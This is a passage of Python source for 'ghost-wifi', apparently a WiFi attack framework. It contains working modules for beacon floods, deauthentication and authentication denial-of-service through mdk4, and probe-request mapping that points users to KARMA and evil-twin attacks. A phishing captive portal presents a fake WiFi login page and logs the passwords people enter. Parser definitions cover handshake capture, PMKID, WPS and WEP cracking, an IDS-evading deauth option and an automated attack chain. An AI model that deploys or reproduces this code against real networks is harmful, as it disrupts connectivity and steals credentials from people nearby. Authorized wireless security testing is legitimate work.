        phy = _phy_name(iface)
        rec["phy"] = phy

        # Band support
        hz2, hz5, hz6 = _band_support(iface)
        rec["band_2ghz"] = hz2
        rec["band_5ghz"] = hz5
        rec["band_6ghz"] = hz6

        # Monitor mode support
        mon_cap = _monitor_capable(iface)
        rec["monitor_capable"] = mon_cap

        # 802.11 capabilities
        if phy:
            phy_out, _, _ = run(f"iw phy {phy} info 2>/dev/null")
            rec["cap_ht"]  = "HT capabilities" in phy_out or "HT20" in phy_out
            rec["cap_vht"] = "VHT capabilities" in phy_out
            rec["cap_he"]  = "HE capabilities" in phy_out or "HE PHY" in phy_out
            # Channel count
            ch_count = len(re.findall(r"\* \d{4} MHz", phy_out))
            rec["channel_count"] = ch_count
        else:
            rec["cap_ht"] = rec["cap_vht"] = rec["cap_he"] = False
            rec["channel_count"] = 0

        # Injection test (optional, requires monitor mode)
        if getattr(args, "test_injection", False):
            if rec["mode"] == "monitor":
                inj_ok, inj_msg = _injection_test(iface)
                rec["injection_ok"] = inj_ok
                rec["injection_msg"] = inj_msg
            else:
                rec["injection_ok"] = None
                rec["injection_msg"] = "not in monitor mode (run: monitor --action start)"

        results.append(rec)

        # Print card
        bands = []
        if rec["band_2ghz"]: bands.append("2.4GHz")
        if rec["band_5ghz"]: bands.append("5GHz")
        if rec["band_6ghz"]: bands.append("6GHz")
        caps = []
        if rec.get("cap_ht"):  caps.append("HT(802.11n)")
        if rec.get("cap_vht"): caps.append("VHT(802.11ac)")
        if rec.get("cap_he"):  caps.append("HE(WiFi6)")

        print(f"\n{W}{'─'*55}{RST}")
        print(f"  {G}Interface :{RST} {iface}  ({rec['mode']})")
        print(f"  {G}MAC       :{RST} {rec['mac']}  {DIM}{rec['vendor']}{RST}")
        print(f"  {G}Driver    :{RST} {rec['driver']}")
        print(f"  {G}Chipset   :{RST} {rec['chipset']}")
        print(f"  {G}Bus type  :{RST} {rec['bus']}" + (f"  ({rec.get('usb_device','')})" if rec.get("usb_device") else ""))
        print(f"  {G}PHY       :{RST} {rec['phy'] or 'n/a'}")
        print(f"  {G}TX Power  :{RST} {rec['tx_power_dbm'] or 'n/a'} dBm")
        print(f"  {G}Bands     :{RST} {', '.join(bands) or 'unknown (not in monitor mode)'}")
        print(f"  {G}802.11    :{RST} {', '.join(caps) or 'basic'}")
        print(f"  {G}Channels  :{RST} {rec['channel_count']} total")
        mon_str = (f"{G}yes{RST}" if rec['monitor_capable'] else f"{R}no{RST}") if rec['monitor_capable'] is not None else f"{Y}unknown{RST}"
        print(f"  {G}Monitor   :{RST} {mon_str}")
        if "injection_ok" in rec:
            inj_str = (f"{G}YES{RST} - {rec['injection_msg']}" if rec['injection_ok']
                       else (f"{R}NO{RST} - {rec['injection_msg']}" if rec['injection_ok'] is False
                             else f"{Y}N/A{RST} - {rec['injection_msg']}"))
            print(f"  {G}Injection :{RST} {inj_str}")

    if not getattr(args, "test_injection", False):
        print(f"\n{DIM}Tip: add --test-injection to run aireplay-ng injection test{RST}")
    if args.output:
        save_json({"nic_analysis": results}, args.output)


# ─── Module: beacon-flood ─────────────────────────────────────────────────────

def cmd_beacon_flood(args):
    """Flood nearby clients with hundreds of fake AP beacons."""
    if not args.no_banner:
        print_banner()
    require_root()
    mon = args.interface
    ssid_prefix = getattr(args, "ssid_prefix", "GhostAP")
    count = getattr(args, "count", 500)
    channel = getattr(args, "channel", None)

    warn("Use only on networks/environments you own or have authorization to test.")

    if channel:
        run(f"iwconfig {mon} channel {channel}")
        ok(f"Fixed to channel {channel}")

    if shutil.which("mdk4"):
        _beacon_flood_mdk4(mon, ssid_prefix, count, args)
    elif shutil.which("mdk3"):
        _beacon_flood_mdk3(mon, ssid_prefix, args)
    elif shutil.which("airbase-ng"):
        _beacon_flood_airbase(mon, ssid_prefix, channel, args)
    else:
        _beacon_flood_hint(mon, ssid_prefix, args)

def _beacon_flood_mdk4(mon, prefix, count, args):
    ssid_file = tempfile.mktemp(prefix="/tmp/ghost_ssids_")
    with open(ssid_file, "w") as f:
        for i in range(count):
            f.write(f"{prefix}_{i:04d}\n")
    ok(f"Generated {count} fake SSIDs with prefix '{prefix}'")
    info(f"Running mdk4 beacon flood on {mon}... Ctrl+C to stop.")
    try:
        subprocess.run(
            f"mdk4 {mon} b -f {ssid_file} -s 1000",
            shell=True
        )
    except KeyboardInterrupt:
        pass
    finally:
        os.unlink(ssid_file)
    ok("Beacon flood stopped.")

def _beacon_flood_mdk3(mon, prefix, args):
    info(f"Running mdk3 beacon flood on {mon}...")
    try:
        subprocess.run(f"mdk3 {mon} b -f -", shell=True,
                       input="\n".join(f"{prefix}_{i}" for i in range(100)),
                       text=True)
    except KeyboardInterrupt:
        pass

def _beacon_flood_airbase(mon, prefix, channel, args):
    ch = channel or 6
    info(f"Airbase-ng beacon flood: launching fake AP '{prefix}' on ch{ch}...")
    info("Note: airbase-ng creates one AP at a time. Use mdk4 for mass flooding.")
    try:
        subprocess.run(
            f"airbase-ng -e '{prefix}' -c {ch} {mon}",
            shell=True
        )
    except KeyboardInterrupt:
        pass

def _beacon_flood_hint(mon, prefix, args):
    warn("No beacon-flood tool found (mdk4/mdk3/airbase-ng).")
    info("Install mdk4: sudo apt install mdk4")
    print(f"""
  Manual beacon flood with mdk4:
    sudo apt install mdk4
    mdk4 {mon} b -s 1000       # flood with random BSSIDs/SSIDs
    mdk4 {mon} b -n {prefix}   # flood with specific SSID

  Manual beacon flood with mdk3:
    sudo apt install mdk3
    mdk3 {mon} b               # flood mode

  Single fake AP with airbase-ng:
    sudo airbase-ng -e "{prefix}" -c 6 {mon}
""")


# ─── Module: probe-hunt ───────────────────────────────────────────────────────

def cmd_probe_hunt(args):
    """Capture probe requests and build device->SSID map with OUI vendor lookup."""
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    duration = args.duration or 60

    info(f"Hunting probe requests on {mon} for {duration}s...")
    info("Every device searching for a known network sends probe requests.")
    out_prefix = tempfile.mktemp(prefix="/tmp/ghost_probe_")
    band_opt = ""
    if getattr(args, "band", None):
        band_opt = f"--band {args.band}"

    proc = subprocess.Popen(
        f"airodump-ng {mon} {band_opt} --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        for i in range(duration):
            time.sleep(1)
            if args.verbose:
                print(f"\r  {C}[*]{RST} Capturing... {i+1}/{duration}s", end="", flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate(); proc.wait()
    if args.verbose:
        print()

    csv_file = f"{out_prefix}-01.csv"
    if not os.path.exists(csv_file):
        err("No capture file created."); return

    _, clients = _parse_airodump_csv(csv_file)

    # Build device map
    device_map = {}
    for c in clients:
        mac = c["mac"].strip()
        probes = [s.strip() for s in c.get("probed_essids", "").split(",") if s.strip()]
        if not probes:
            continue
        vendor = _oui_vendor(mac)
        if mac not in device_map:
            device_map[mac] = {"mac": mac, "vendor": vendor, "power": c["power"],
                               "bssid": c["bssid"], "ssids": set()}
        device_map[mac]["ssids"].update(probes)

    # Also show all clients even without probes
    for c in clients:
        mac = c["mac"].strip()
        if mac not in device_map:
            device_map[mac] = {"mac": mac, "vendor": _oui_vendor(mac),
                               "power": c["power"], "bssid": c["bssid"], "ssids": set()}

    # Print results
    print(f"\n{W}Probe Request Map - {len(device_map)} devices detected{RST}\n")
    print(f"{W}{'MAC':<19} {'PWR':<5} {'VENDOR':<20} {'ASSOC':<19} PROBED SSIDs{RST}")
    print("-" * 100)
    sorted_devs = sorted(device_map.values(),
                         key=lambda d: len(d["ssids"]), reverse=True)
    for dev in sorted_devs:
        ssids_str = ", ".join(sorted(dev["ssids"])) if dev["ssids"] else f"{DIM}(no probes){RST}"
        vendor_str = dev["vendor"][:19]
        assoc = dev["bssid"] if dev["bssid"] != "(not associated)" else f"{DIM}(unassoc){RST}"
        bar = _signal_bar(dev["power"], 6)
        print(f"  {dev['mac']:<19} {bar} {dev['power']:<4} {DIM}{vendor_str:<20}{RST} {assoc:<19} {ssids_str}")

    ok(f"{len([d for d in device_map.values() if d['ssids']])} devices with probe requests")

    # Fingerprint hints
    if any(d["ssids"] for d in device_map.values()):
        print(f"\n{Y}[~]{RST} Devices looking for known networks are vulnerable to KARMA/Evil-Twin attacks.")
        print(f"    Use: ghost-wifi.py karma -i {mon}")
        print(f"    Or:  ghost-wifi.py evil-twin -i {mon} --essid <SSID>")

    if args.output:
        result = [{**d, "ssids": list(d["ssids"])} for d in device_map.values()]
        save_json({"probe_map": result, "total_devices": len(device_map)}, args.output)

    for f in Path("/tmp").glob("ghost_probe_*"):
        try: f.unlink()
        except: pass


# ─── Module: captive-portal ───────────────────────────────────────────────────

_PORTAL_HTML = """\
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Authentication</title>
<style>
  * {{box-sizing:border-box;margin:0;padding:0}}
  body {{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;
        align-items:center;justify-content:center;min-height:100vh}}
  .card {{background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,.15);
          padding:36px 32px;width:360px;max-width:95vw}}
  .logo {{text-align:center;margin-bottom:24px}}
  .logo h2 {{font-size:1.4rem;color:#333}}
  .logo p  {{font-size:.85rem;color:#888;margin-top:4px}}
  label {{display:block;font-size:.85rem;color:#555;margin-bottom:4px;margin-top:16px}}
  input  {{width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:5px;
           font-size:.95rem;outline:none}}
  input:focus {{border-color:#1a73e8}}
  button {{margin-top:20px;width:100%;padding:12px;background:#1a73e8;color:#fff;
           border:none;border-radius:5px;font-size:1rem;cursor:pointer}}
  button:hover {{background:#1558b0}}
  .note {{margin-top:14px;font-size:.78rem;color:#aaa;text-align:center}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <h2>&#127760; WiFi Login</h2>
    <p>Enter your credentials to continue</p>
  </div>
  <form method="POST" action="/submit">
    <label>Username / Email</label>
    <input type="text" name="user" placeholder="user@example.com" required>
    <label>Password</label>
    <input type="password" name="pass" placeholder="WiFi password" required>
    <button type="submit">Connect</button>
  </form>
  <p class="note">Secure connection. Your data is protected.</p>
</div>
</body></html>
"""

_PORTAL_SUCCESS_HTML = """\
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Connected</title>
<style>body{{font-family:Arial,sans-serif;text-align:center;padding:60px;background:#f5f5f5}}
.msg{{background:#fff;border-radius:8px;padding:40px;display:inline-block;
      box-shadow:0 2px 16px rgba(0,0,0,.15)}}
h2{{color:#1a73e8}} p{{color:#555;margin-top:12px}}</style>
</head><body><div class="msg">
<h2>&#10003; Connected!</h2>
<p>You are now connected to the network.</p>
<p><small>Redirecting...</small></p>
</div>
<script>setTimeout(()=>{{window.location='http://google.com'}},3000)</script>
</body></html>
"""

class _PortalHandler(http.server.BaseHTTPRequestHandler):
    log_file = None
    creds_found = []

    def log_message(self, fmt, *a):
        pass  # suppress server log noise

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(_PORTAL_HTML.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        params = urllib.parse.parse_qs(body)
        user = params.get("user", [""])[0]
        pwd  = params.get("pass", [""])[0]
        ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        entry = {"time": ts, "ip": client_ip, "user": user, "password": pwd}
        _PortalHandler.creds_found.append(entry)

        print(f"\n{G}[+]{RST} CREDENTIAL CAPTURED!")
        print(f"    {W}Time    :{RST} {ts}")
        print(f"    {W}Client  :{RST} {client_ip}")
        print(f"    {W}User    :{RST} {user}")
        print(f"    {W}Pass    :{RST} {pwd}")

        if _PortalHandler.log_file:
            try:
                with open(_PortalHandler.log_file, "a") as lf:
                    lf.write(json.dumps(entry) + "\n")
                ok(f"Saved to {_PortalHandler.log_file}")
            except Exception as e:
                warn(f"Could not write log: {e}")

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(_PORTAL_SUCCESS_HTML.encode())

def cmd_captive_portal(args):
    """Launch a standalone captive portal HTTP server for credential harvesting."""
    if not args.no_banner:
        print_banner()
    port = getattr(args, "port", 8080) or 8080
    bind = getattr(args, "bind", "0.0.0.0") or "0.0.0.0"
    log_path = args.output or "/tmp/ghost_portal_creds.jsonl"

    _PortalHandler.log_file = log_path
    _PortalHandler.creds_found = []

    info(f"Captive Portal starting on {bind}:{port}")
    info(f"Credentials log: {log_path}")
    warn("Use only on networks/environments you own or have authorization to test.")
    warn("Combine with evil-twin: ghost-wifi.py evil-twin -i <iface> --essid <SSID>")
    info("Press Ctrl+C to stop.")

    if port < 1024 and os.geteuid() != 0:
        warn("Port < 1024 requires root. Use --port 8080 or run as root.")

    try:
        with socketserver.TCPServer((bind, port), _PortalHandler) as server:
            server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            ok(f"Listening at http://{bind}:{port}")
            server.serve_forever()
    except KeyboardInterrupt:
        pass
    except OSError as e:
        err(f"Cannot bind {bind}:{port} - {e}")
        info("Try: sudo ghost-wifi.py captive-portal --port 80 -i wlan0")

    print()
    ok(f"Portal stopped. Captured {len(_PortalHandler.creds_found)} credential(s).")
    if _PortalHandler.creds_found:
        print(f"\n{W}Captured Credentials:{RST}")
        for c in _PortalHandler.creds_found:
            print(f"  {c['time']}  {c['ip']:<15}  {c['user']}:{c['password']}")


# ─── Module: mdk4 ─────────────────────────────────────────────────────────────

def cmd_mdk4(args):
    """MDK4 wrapper: beacon flood, deauth storm, auth DoS, probe flood."""
    if not args.no_banner:
        print_banner()
    require_root()
    mon = args.interface
    mode = getattr(args, "mdk_mode", "b")
    warn("Use only on networks/environments you own or have authorization to test.")

    if not shutil.which("mdk4"):
        _mdk4_hint(mon)
        return

    if mode == "b":
        # Beacon flood
        ssid_prefix = getattr(args, "ssid_prefix", "GhostAP")
        count = getattr(args, "count", 500)
        ssid_file = tempfile.mktemp(prefix="/tmp/ghost_mdk4_ssids_")
        with open(ssid_file, "w") as f:
            for i in range(count):
                f.write(f"{ssid_prefix}_{i:04d}\n")
        info(f"MDK4 beacon flood: {count} fake SSIDs, prefix='{ssid_prefix}'")
        cmd_str = f"mdk4 {mon} b -f {ssid_file} -s 1000"

    elif mode == "d":
        # Deauth / disassociation storm
        bssid = args.bssid if hasattr(args, "bssid") and args.bssid else None
        bl_opt = f"-B {bssid}" if bssid else "-w /dev/null"
        info(f"MDK4 deauth storm on {mon}" + (f" targeting {bssid}" if bssid else " (broadcast)"))
        cmd_str = f"mdk4 {mon} d {bl_opt}"

    elif mode == "a":
        # Authentication DoS
        bssid = args.bssid if hasattr(args, "bssid") and args.bssid else None
        b_opt = f"-a {bssid}" if bssid else ""
        info(f"MDK4 auth DoS on {mon}" + (f" -> {bssid}" if bssid else " (all APs)"))
        cmd_str = f"mdk4 {mon} a {b_opt} -s 400"

    elif mode == "p":
        # Probe flood / SSID list probe
        info(f"MDK4 probe flood on {mon}")
        cmd_str = f"mdk4 {mon} p"

    elif mode == "e":
        # EAPOL Start flood
        bssid = args.bssid if hasattr(args, "bssid") and args.bssid else None
        b_opt = f"-t {bssid}" if bssid else ""
        info(f"MDK4 EAPOL Start flood on {mon}")
        cmd_str = f"mdk4 {mon} e {b_opt}"

    elif mode == "m":
        # Michael Shutdown (TKIP MIC failure)
        bssid = args.bssid if hasattr(args, "bssid") and args.bssid else None
        b_opt = f"-t {bssid}" if bssid else ""
        info(f"MDK4 Michael/TKIP MIC shutdown on {mon}")
        warn("This triggers MIC failure countermeasures (TKIP only, rate-limited by AP).")
        cmd_str = f"mdk4 {mon} m {b_opt}"

    else:
        err(f"Unknown MDK4 mode: {mode}. Supported: b, d, a, p, e, m")
        return

    info(f"Running: {cmd_str}")
    info("Press Ctrl+C to stop.")
    try:
        subprocess.run(cmd_str, shell=True)
    except KeyboardInterrupt:
        pass
    finally:
        if mode == "b":
            ssid_file_ref = cmd_str.split("-f ")[1].split(" ")[0]
            try:
                os.unlink(ssid_file_ref)
            except:
                pass
    ok("MDK4 stopped.")

def _mdk4_hint(mon):
    warn("mdk4 not found.")
    info("Install: sudo apt install mdk4")
    print(f"""
  MDK4 mode reference:
    b - Beacon Flood (fake SSIDs to confuse scanners)
      mdk4 {mon} b -s 1000

    d - Deauth / Disassociation Storm
      mdk4 {mon} d                    # all APs
      mdk4 {mon} d -B AA:BB:CC:DD:EE:FF   # specific AP

    a - Authentication DoS (flood auth frames)
      mdk4 {mon} a -a AA:BB:CC:DD:EE:FF

    p - Probe flood
      mdk4 {mon} p

    e - EAPOL Start flood
      mdk4 {mon} e -t AA:BB:CC:DD:EE:FF

    m - Michael/TKIP MIC failure (TKIP countermeasure trigger)
      mdk4 {mon} m -t AA:BB:CC:DD:EE:FF
""")


# ─── Module: fingerprint ──────────────────────────────────────────────────────

def cmd_fingerprint(args):
    """Fingerprint APs and clients: OUI vendor, probe response analysis, encryption profile."""
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    duration = args.duration or 30

    info(f"Fingerprinting on {mon} for {duration}s...")
    out_prefix = tempfile.mktemp(prefix="/tmp/ghost_fp_")
    proc = subprocess.Popen(
        f"airodump-ng {mon} --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(duration)
    proc.terminate(); proc.wait()

    csv_file = f"{out_prefix}-01.csv"
    if not os.path.exists(csv_file):
        err("No capture file created."); return

    aps, clients = _parse_airodump_csv(csv_file)

    print(f"\n{W}AP Fingerprints - {len(aps)} networks{RST}\n")
    print(f"{W}{'BSSID':<19} {'VENDOR':<20} {'ENC':<14} {'CH':<4} {'ESSID'}{RST}")
    print("-" * 85)
    for ap in sorted(aps, key=lambda a: a["essid"] or ""):
        vendor = _oui_vendor(ap["bssid"])
        enc = ap["privacy"]
        enc_risk = ""
        if "WEP" in enc:
            enc_risk = f" {R}[CRACKABLE]{RST}"
        elif enc.strip() == "" or "OPN" in enc:
            enc_risk = f" {R}[OPEN]{RST}"
        elif "SAE" in enc:
            enc_risk = f" {M}[WPA3]{RST}"
        hidden = f"{DIM}<hidden>{RST}" if not ap["essid"] else ap["essid"]
        print(f"  {ap['bssid']:<19} {DIM}{vendor:<20}{RST} {enc:<14} {ap['channel']:<4} {hidden}{enc_risk}")

    if clients:
        print(f"\n{W}Client Fingerprints - {len(clients)} devices{RST}\n")
        print(f"{W}{'MAC':<19} {'VENDOR':<22} {'ASSOC AP':<19} {'PROBED SSIDs'}{RST}")
        print("-" * 90)
        for c in clients:
            vendor = _oui_vendor(c["mac"])
            probes = c.get("probed_essids", "")
            assoc = c["bssid"] if c["bssid"] not in ("(not associated)", "") else f"{DIM}(unassoc){RST}"
            print(f"  {c['mac']:<19} {DIM}{vendor:<22}{RST} {assoc:<19} {probes}")

    ok(f"Fingerprinted {len(aps)} APs, {len(clients)} clients")
    if args.output:
        save_json({"aps": aps, "clients": clients}, args.output)

    for f in Path("/tmp").glob("ghost_fp_*"):
        try: f.unlink()
        except: pass


# ─── Module: channelfix ───────────────────────────────────────────────────────

def cmd_channelfix(args):
    """Force a specific channel on a wireless interface."""
    if not args.no_banner:
        print_banner()
    require_root()
    iface = args.interface
    channel = args.channel

    info(f"Setting {iface} to channel {channel}...")
    # Try iw first (preferred), then iwconfig
    _, _, rc1 = run(f"iw dev {iface} set channel {channel} 2>/dev/null")
    if rc1 != 0:
        _, _, rc2 = run(f"iwconfig {iface} channel {channel} 2>/dev/null")
        if rc2 != 0:
            # Try setting on the phy
            phy = _phy_name(iface)
            if phy:
                run(f"iw phy {phy} set channel {channel}")
            else:
                err(f"Could not set channel {channel} on {iface}")
                return
    # Verify
    out, _, _ = run(f"iw dev {iface} info 2>/dev/null")
    ch_m = re.search(r"channel (\d+)", out)
    if ch_m:
        ok(f"{iface} is now on channel {ch_m.group(1)}")
    else:
        ok(f"Channel set command sent for {iface} ch{channel}")


# ─── Module: 5ghz-scan ────────────────────────────────────────────────────────

def cmd_5ghz_scan(args):
    """Dedicated 5GHz scan for networks on 802.11a/n/ac/ax channels."""
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("airodump-ng")
    mon = args.interface
    duration = args.duration or 30

    info(f"Scanning 5GHz band on {mon} for {duration}s...")
    warn("Interface must support 5GHz. Check with: ghost-wifi.py nic-detect")
    out_prefix = tempfile.mktemp(prefix="/tmp/ghost_5g_")
    proc = subprocess.Popen(
        f"airodump-ng {mon} --band a --write {out_prefix} --output-format csv -a",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate(); proc.wait()

    csv_file = f"{out_prefix}-01.csv"
    if not os.path.exists(csv_file):
        err("No scan output. Does the interface support 5GHz?")
        info("Check: ghost-wifi.py nic-detect --test-injection")
        return

    aps, clients = _parse_airodump_csv(csv_file)
    # Filter to 5GHz channels (36-177)
    aps_5g = [a for a in aps if a["channel"].strip().isdigit() and int(a["channel"]) >= 36]
    _print_scan_results(aps_5g, clients, args.verbose)
    info(f"5GHz channels found: {sorted({a['channel'] for a in aps_5g})}")
    if args.output:
        save_json({"band": "5ghz", "aps": aps_5g, "clients": clients}, args.output)
    for f in Path("/tmp").glob("ghost_5g_*"):
        try: f.unlink()
        except: pass


# ─── Module: injection-test ───────────────────────────────────────────────────

def cmd_injection_test(args):
    """Test packet injection capability on a monitor-mode interface."""
    if not args.no_banner:
        print_banner()
    require_root()
    require_tool("aireplay-ng")
    mon = args.interface

    info(f"Testing injection capability on {mon}...")
    warn("Interface must be in monitor mode.")

    # Check mode
    out, _, _ = run(f"iw dev {mon} info 2>/dev/null")
    mode = re.search(r"type (\S+)", out)
    if mode and mode.group(1) != "monitor":
        warn(f"{mon} is in '{mode.group(1)}' mode - switch to monitor first.")
        info(f"Run: ghost-wifi.py monitor -i {mon} --action start")

    # Basic test
    info("Running aireplay-ng --test (may take ~15s)...")
    out, err_s, rc = run(f"aireplay-ng --test {mon} 2>&1", timeout=30)
    combined = out + err_s
    print(combined[:800])

    # Extended test with BSSID
    bssid = getattr(args, "bssid", None)
    if bssid:
        info(f"Running extended injection test against {bssid}...")
        out2, _, _ = run(f"aireplay-ng --test -b {bssid} {mon} 2>&1", timeout=30)
        print(out2[:600])

    # Parse result
    combined_l = combined.lower()
    if "injection is working" in combined_l or "injected" in combined_l:
        ok(f"INJECTION WORKS on {mon}")
        pkt = re.search(r"(\d+)\s*(?:packet|frame)", combined_l)
        if pkt:
            ok(f"Injected {pkt.group(1)} packets successfully")
    elif "not working" in combined_l or "0 injection" in combined_l:
        err(f"Injection NOT working on {mon}")
        info("Possible causes: wrong driver, monitor mode not set, RF killed")
    else:
        warn("Inconclusive result - check output above")

    # Driver info
    drv = _get_driver(mon)
    if drv:
        chipset = _DRIVER_CHIPSET.get(drv, f"({drv})")
        info(f"Driver: {drv} -> {chipset}")


# ─── Built-in mini wordlist ───────────────────────────────────────────────────

MINI_WORDLIST = [
    "password", "12345678", "123456789", "1234567890", "password1",
    "qwerty123", "abc123456", "letmein1", "monkey123", "dragon123",
    "admin", "admin123", "root", "toor", "pass", "test", "12345",
    "password123", "iloveyou", "sunshine", "princess", "welcome",
    "shadow", "master", "batman", "superman", "1q2w3e4r",
]

# ─── Argument Parser ──────────────────────────────────────────────────────────

def build_parser():
    p = argparse.ArgumentParser(
        prog="ghost-wifi",
        description="Ghost-WiFi - WiFi Attack & Audit Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument("--no-banner", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-o", "--output", help="Save output to JSON/file")

    sub = p.add_subparsers(dest="command", required=True)

    # ifaces
    sub.add_parser("ifaces", help="List wireless interfaces")

    # monitor
    mon = sub.add_parser("monitor", help="Manage monitor mode")
    mon.add_argument("-i", "--interface", required=True)
    mon.add_argument("--action", choices=["start", "stop", "check"], default="start")
    mon.add_argument("--channel", type=int)

    # scan
    sc = sub.add_parser("scan", help="Scan for APs and clients")
    sc.add_argument("-i", "--interface")
    sc.add_argument("--channel", type=int)
    sc.add_argument("--band", choices=["a", "b", "abg", "abgn"])
    sc.add_argument("--duration", type=int, default=30)

    # hop
    hop = sub.add_parser("hop", help="Channel hopping")
    hop.add_argument("-i", "--interface", required=True)
    hop.add_argument("--channels", help="Comma-separated channels (default: 1-14)")
    hop.add_argument("--delay", type=float, default=0.5)

    # deauth
    da = sub.add_parser("deauth", help="Deauthentication attack")
    da.add_argument("-i", "--interface", required=True)
    da.add_argument("--bssid", help="Target AP MAC")
    da.add_argument("--bssid-list", dest="bssid_list", help="Comma-separated BSSID list for multi-target rotation")
    da.add_argument("--client", default="FF:FF:FF:FF:FF:FF", help="Client MAC (default: broadcast)")
    da.add_argument("--channel", type=int)
    da.add_argument("--count", type=int, default=0, help="Deauth frames per burst (0=continuous)")
    da.add_argument("--mac-rand", action="store_true", help="Randomize MAC before attack")
    da.add_argument("--rand-interval", action="store_true", dest="rand_interval",
                    help="Randomize delay between bursts (IDS evasion)")
    da.add_argument("--interval-min", type=float, default=1.0, dest="interval_min")
    da.add_argument("--interval-max", type=float, default=5.0, dest="interval_max")

    # capture
    cap = sub.add_parser("capture", help="Capture WPA/WPA2 4-way handshake")
    cap.add_argument("-i", "--interface", required=True)
    cap.add_argument("--bssid", required=True)
    cap.add_argument("--essid")
    cap.add_argument("--channel", type=int)
    cap.add_argument("--passive", action="store_true", help="No deauth, passive capture only")
    cap.add_argument("--timeout", type=int, default=120)
    cap.add_argument("--mac-rand", action="store_true", help="Randomize MAC before capture")

    # pmkid
    pm = sub.add_parser("pmkid", help="Clientless PMKID attack")
    pm.add_argument("-i", "--interface", required=True)
    pm.add_argument("--bssid", help="Target AP MAC (optional, all if omitted)")
    pm.add_argument("--duration", type=int, default=60)

    # wps
    wps = sub.add_parser("wps", help="WPS attacks (Pixie Dust, PIN)")
    wps.add_argument("-i", "--interface", required=True)
    wps.add_argument("--bssid")
    wps.add_argument("--channel", type=int, default=1)
    wps.add_argument("--action", choices=["scan", "pixie", "pin", "bully"], default="scan")
    wps.add_argument("--pin", help="Known WPS PIN to test")

    # evil-twin
    et = sub.add_parser("evil-twin", help="Evil Twin / Rogue AP")
    et.add_argument("-i", "--interface", required=True)
    et.add_argument("--essid", required=True, help="SSID to impersonate")
    et.add_argument("--bssid", help="BSSID to spoof")
    et.add_argument("--channel", type=int, default=6)
    et.add_argument("--captive-portal", action="store_true")

    # crack
    cr = sub.add_parser("crack", help="Crack handshake (aircrack-ng or hashcat)")
    cr.add_argument("--cap", required=True, help="Capture file (.cap or .hc22000)")
    cr.add_argument("--wordlist", help="Wordlist file")
    cr.add_argument("--wordlist2", dest="wordlist2", help="Second wordlist (combo attack)")
    cr.add_argument("--essid", help="Target ESSID")
    cr.add_argument("--hashcat", action="store_true", help="Use hashcat instead of aircrack-ng")
    cr.add_argument("--hash-mode", type=int, default=22000, dest="hash_mode")
    cr.add_argument("--rules", help="Hashcat rules file")
    cr.add_argument("--rule-preset", dest="rule_preset",
                    choices=list(_RULE_PRESETS.keys()),
                    help="Built-in rule preset (append-digits, capitalize, leet, best64)")
    cr.add_argument("--attack-mode", dest="attack_mode",
                    choices=["wordlist", "mask", "combo", "john"], default="wordlist",
                    help="Attack mode: wordlist (default), mask (-a3), combo (-a1), john")
    cr.add_argument("--mask", help="Hashcat mask for mask attack (e.g. '?d?d?d?d?d?d?d?d')")

    # wep
    wep = sub.add_parser("wep", help="WEP cracking")
    wep.add_argument("-i", "--interface", required=True)
    wep.add_argument("--bssid", required=True)
    wep.add_argument("--channel", type=int, default=1)
    wep.add_argument("--attack", choices=["arp", "frag", "chopchop"], default="arp")

    # clients
    cl = sub.add_parser("clients", help="Track and log clients")
    cl.add_argument("-i", "--interface", required=True)
    cl.add_argument("--bssid")
    cl.add_argument("--channel", type=int)
    cl.add_argument("--duration", type=int, default=30)

    # karma
    ka = sub.add_parser("karma", help="KARMA attack - respond to all probes")
    ka.add_argument("-i", "--interface", required=True)

    # handshake
    hs = sub.add_parser("handshake", help="Handshake tools (verify, convert, strip)")
    hs.add_argument("--cap", required=True)
    hs.add_argument("--action", choices=["verify", "convert", "strip"], default="verify")

    # info
    sub.add_parser("info", help="Check tool dependencies")

    # auto (automated attack chain)
    at = sub.add_parser("auto", help="Automated scan->deauth->capture chain")
    at.add_argument("-i", "--interface", required=True)
    at.add_argument("--bssid", help="Target BSSID (auto-select strongest if omitted)")
    at.add_argument("--scan-time", type=int, default=20, help="Scan duration in seconds")
    at.add_argument("--deauth-rounds", type=int, default=5, help="Deauth rounds before giving up")
    at.add_argument("--target-enc", default="WPA", help="Target encryption filter (WPA, WEP, OPN)")
    at.add_argument("--band", choices=["a", "b", "abg", "abgn"], help="Band to scan")
    at.add_argument("--mac-rand", action="store_true", help="Randomize MAC address before attack")
    at.add_argument("--passive", action="store_true", help="No deauth, passive capture only")
    at.add_argument("--no-pmkid-fallback", action="store_false", dest="pmkid_fallback",
                    help="Disable PMKID fallback when handshake capture fails")

    # decloak (hidden SSID)
    dc = sub.add_parser("decloak", help="Detect hidden SSIDs from probe traffic")
    dc.add_argument("-i", "--interface", required=True)
    dc.add_argument("--duration", type=int, default=60, help="Listen duration in seconds")

    # eapol (re-injection)
    ep = sub.add_parser("eapol", help="EAPOL frame re-injection from capture file")
    ep.add_argument("-i", "--interface", required=True)
